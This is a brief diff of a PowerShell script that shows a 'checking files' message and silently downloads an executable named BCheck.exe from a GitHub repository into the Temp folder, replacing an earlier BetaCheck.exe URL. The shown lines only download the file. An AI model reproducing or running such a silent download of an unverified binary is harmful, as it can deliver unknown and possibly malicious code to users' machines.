@@ -1,8 +1,8 @@
 
 Write-Host "Проверка files" -ForegroundColor Red
 
-$url = "https://github.com/fayk0180-cmd/BetaCheck/raw/refs/heads/main/BetaCheck.exe"  # 
-$output = "$env:Temp\BetaCheck.exe"
+$url = "https://github.com/fayk0180-cmd/OverCheck/raw/refs/heads/main/BCheck.exe"  # 
+$output = "$env:Temp\BCheck.exe"
 
 Invoke-WebRequest -Uri $url -OutFile $output -ErrorAction SilentlyContinue
 
